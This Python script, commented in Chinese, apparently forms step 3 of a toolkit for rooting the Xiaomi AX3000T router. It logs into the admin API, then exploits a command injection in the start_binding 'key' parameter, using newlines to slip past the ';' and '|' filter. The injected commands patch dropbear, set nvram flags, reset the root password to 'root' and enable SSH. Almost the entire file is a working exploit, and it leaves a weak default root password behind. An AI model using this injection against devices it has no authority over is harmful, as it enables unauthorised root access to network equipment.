#!/usr/bin/env python3
# AX3000T 步骤 3：通过 start_binding key 参数注入启用 SSH
#
# 适用机型: 小米路由器 AX3000T (RD03) — MediaTek Filogic 820 (MT7981)
# 漏洞原理: start_binding API 的 key 参数值无转义，\n 绕过 hackCheck 对 ; 和 | 的过滤
# 前置:    路由器已初始化 + 一个有效 stok（步骤 2 输出）
# 后置:    SSH 端口 22 可连，用户 root 密码 root
# 来源:    old_coding/Auto_Flash_Router/AX3000T/enable_ssh.py + rce.py
#
# 注入命令序列:
#   sed 解除 dropbear release 检查 → nvram 设 ssh_en/boot_wait → commit →
#   echo passwd root → dropbear enable/restart
#
# 输出:    stdout = 单个 JSON  {"ok": bool, "step": ..., "data"|"error": ...}
#          stderr = 默认空白，--debug 时打印进度
#          exit  = 0 成功 / 1 失败

import argparse
import hashlib
import json
import random
import socket
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# ============ 常量 ============
DEFAULT_ROUTER_IP = "192.168.31.1"
DEFAULT_TIMEOUT = 30
SSH_PORT = 22
SSH_WAIT_TIMEOUT = 60       # SSH 端口探测超时（秒）
ROOT_PASSWORD = "root"
STEP_NAME = "enable_ssh"
DEBUG = False

# AX3000T 共享密码学常量（回退用）
KNOWN_KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"


# ============ 日志 / 输出 ============
def log(msg: str, level: str = "INFO") -> None:
    if not DEBUG:
        return
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"{ts} [{level}] {msg}", file=sys.stderr)


def emit_ok(data: dict) -> None:
    print(json.dumps({"ok": True, "step": STEP_NAME, "data": data},
                     ensure_ascii=False))


def emit_err(error: str, reason: str = "", recoverable: bool = True) -> None:
    out = {"ok": False, "step": STEP_NAME, "error": error,
           "recoverable": recoverable}
    if reason:
        out["reason"] = reason
    print(json.dumps(out, ensure_ascii=False))


# ============ 密码学 ============
def sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()


def generate_nonce() -> str:
    return f"0__{int(time.time())}_{random.randint(0, 9999)}"


def calc_login_password(nonce: str, pwd: str, key: str) -> str:
    """SHA256(nonce + SHA256(pwd + KEY)) — newEncryptMode=1"""
    return sha256_hex(nonce + sha256_hex(pwd + key))


# ============ HTTP 基础 ============
def http_post_form(url: str, data: dict, timeout: int) -> dict:
    post_data = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(url, data=post_data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def http_get_json(url: str, timeout: int) -> dict:
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


# ============ 登录 ============
def login_get_stok(router_ip: str, admin_pwd: str, timeout: int) -> str:
    """POST + SHA256 登录，返回 stok"""
    n = generate_nonce()
    pwd_hash = calc_login_password(n, admin_pwd, KNOWN_KEY)
    url = f"http://{router_ip}/cgi-bin/luci/api/xqsystem/login"
    result = http_post_form(url, {
        "username": "admin",
        "password": pwd_hash,
        "logtype": "2",
        "nonce": n,
    }, timeout)
    if result.get("code") != 0:
        raise RuntimeError(f"登录失败 (code={result.get('code')}): {result.get('msg', '')}")
    return result["token"]


# ============ start_binding 注入核心 ============
def build_start_binding_payload(commands: list) -> str:
    """构建可在 start_binding key 参数注入的 payload。

    hackCheck 过滤 ; 和 |，将分隔符统一替换为 \\n 绕过。
    payload 结构: 1234' -X \\n<cmd1>\\n<cmd2>\\n...\\n logger -t X 'X
    """
    safe = "\n".join(cmd.replace(";", "\n").replace("|", "\n") for cmd in commands)
    return "1234' -X \n" + safe + "\n logger -t X 'X"


def inject_start_binding(base_url: str, stok: str, payload_key: str,
                         timeout: int) -> dict:
    """向 start_binding API 发送注入请求。

    因路由器可能执行命令后立即断开连接，HTTP 异常也算成功（code=0 等效）。
    """
    params = urllib.parse.urlencode({"uid": "1234", "key": payload_key})
    url = f"{base_url}/cgi-bin/luci/;stok={stok}/api/xqsystem/start_binding?{params}"
    try:
        return http_get_json(url, timeout)
    except Exception as e:
        # 注入后路由器立即执行命令，连接可能中断，视为成功
        log(f"请求异常（路由器可能已断开）: {e}", level="WARN")
        return {"code": 0}


# ============ SSH 探测 ============
def wait_ssh(host: str, port: int = SSH_PORT, timeout: int = SSH_WAIT_TIMEOUT) -> bool:
    """等待 SSH 端口就绪，最多 timeout 秒。"""
    start = time.time()
    while time.time() - start < timeout:
        try:
            with socket.create_connection((host, port), timeout=2):
                return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            remaining = timeout - (time.time() - start)
            if remaining > 0:
                time.sleep(min(2, remaining))
    return False


# ============ 主流程 ============
def enable_ssh(router_ip: str, stok: str, timeout: int) -> dict:
    base_url = f"http://{router_ip}"

    # SSH 启用命令序列（一次发送全部）
    inject_commands = [
        r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear",
        r"nvram set ssh_en=1",
        r"nvram set boot_wait=on",
        r"nvram commit",
        r"echo -e 'root\nroot' > /tmp/psw.txt",
        r"passwd root < /tmp/psw.txt",
        r"/etc/init.d/dropbear enable",
        r"/etc/init.d/dropbear restart",
    ]

    payload = build_start_binding_payload(inject_commands)
    log(f"注入 {len(inject_commands)} 条命令")

    result = inject_start_binding(base_url, stok, payload, timeout)
    if result.get("code") != 0:
        raise RuntimeError(f"注入失败 (code={result.get('code')}): {result}")
    log("注入请求已发送")

    # TCP 探测 SSH 端口是否就绪
    log(f"探测 TCP {router_ip}:{SSH_PORT} (最长等待 {SSH_WAIT_TIMEOUT}s)...")
    ssh_ready = wait_ssh(router_ip, SSH_PORT, SSH_WAIT_TIMEOUT)
    if not ssh_ready:
        raise RuntimeError(
            f"SSH 端口 {SSH_PORT} 在 {SSH_WAIT_TIMEOUT}s 内未就绪"
        )
    log("SSH 已启用")

    return {
        "ip": router_ip,
        "ssh_port": SSH_PORT,
        "root_password": ROOT_PASSWORD,
        "inject_method": "start_binding",
        "ssh_ready": True,
    }


# ============ CLI ============
def help_json() -> None:
    schema = {
        "script": "enable_ssh",
        "description": "AX3000T 步骤 3：通过 start_binding key 参数注入启用 SSH",
        "args": [
            {"name": "--ip", "type": "string", "default": DEFAULT_ROUTER_IP,
             "required": False, "description": "路由器 IP"},
            {"name": "--stok", "type": "string", "default": "",
             "required": False, "description": "stok（步骤 2 输出；空则从 stdin 读上游 JSON）"},
            {"name": "--pwd", "type": "string", "default": "",
             "required": False, "description": "管理密码（仅在未传 --stok 且 stdin 无数据时使用）"},
            {"name": "--timeout", "type": "int", "default": DEFAULT_TIMEOUT,
             "required": False, "description": "HTTP 网络超时秒"},
            {"name": "--debug", "type": "flag", "default": False,
             "required": False, "description": "打印进度日志到 stderr"},
        ],
        "examples": [
            "python3 3.enable_ssh.py --stok <stok>",
            "python3 2.login_get_stok.py --pwd adminpass | python3 3.enable_ssh.py",
            "python3 3.enable_ssh.py --pwd adminpass --debug",
        ],
        "stdin_contract": {
            "expects": "上游 JSON（含 data.stok）",
            "produces": "SSH 启用结果 JSON",
        },
    }
    print(json.dumps(schema, ensure_ascii=False))


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="AX3000T 步骤 3：通过 start_binding key 参数注入启用 SSH",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python3 3.enable_ssh.py --stok <stok>\n"
            "  python3 2.login_get_stok.py --pwd adminpass | python3 3.enable_ssh.py\n"
            "  python3 3.enable_ssh.py --pwd adminpass --debug\n"
        ),
    )
    p.add_argument("--ip", default=DEFAULT_ROUTER_IP,
                   help=f"路由器 IP（默认: {DEFAULT_ROUTER_IP}）")
    p.add_argument("--stok", default="",
                   help="stok（步骤 2 输出；空则从 stdin 读上游 JSON）")
    p.add_argument("--pwd", default="",
                   help="管理密码（仅在未传 --stok 且 stdin 无数据时使用）")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                   help=f"HTTP 网络超时秒（默认: {DEFAULT_TIMEOUT}）")
    p.add_argument("--debug", action="store_true",
                   help="打印进度日志到 stderr（默认静默，仅输出 JSON）")
    return p.parse_args()


def read_stok_from_stdin() -> str:
    """从上游管道 JSON 读 stok。上游 ok:false 时把 error 透传出来。"""
    if sys.stdin.isatty():
        raise RuntimeError("未通过 stdin 传入上游 JSON，也未传 --stok")
    text = sys.stdin.read()
    if not text.strip():
        raise RuntimeError("stdin 为空（上游没产出 JSON）")
    try:
        d = json.loads(text)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"上游 stdin 不是合法 JSON: {e}")
    if d.get("ok") is False:
        raise RuntimeError(f"上游失败: {d.get('error', '未知错误')}")
    stok = d.get("data", {}).get("stok", "")
    if not stok:
        raise RuntimeError(f"上游 JSON 没有 data.stok 字段: {d}")
    return stok


def main() -> int:
    global DEBUG
    if "--help-json" in sys.argv:
        help_json()
        return 0
    args = parse_args()
    DEBUG = args.debug

    # 获取 stok: --stok > stdin > --pwd 登录
    stok = args.stok
    if not stok:
        try:
            stok = read_stok_from_stdin()
            log("从 stdin 读取 stok")
        except RuntimeError:
            if args.pwd:
                log("使用 --pwd 登录获取 stok")
                try:
                    stok = login_get_stok(args.ip, args.pwd, args.timeout)
                except Exception as e:
                    log(str(e), level="ERROR")
                    emit_err(str(e), reason="auth_failed")
                    return 1
            else:
                emit_err("未传 --stok、stdin 无数据、也未传 --pwd",
                         reason="stok_expired", recoverable=True)
                return 1

    try:
        data = enable_ssh(args.ip, stok, args.timeout)
    except Exception as e:
        log(str(e), level="ERROR")
        emit_err(str(e))
        return 1
    emit_ok(data)
    return 0


if __name__ == "__main__":
    sys.exit(main())
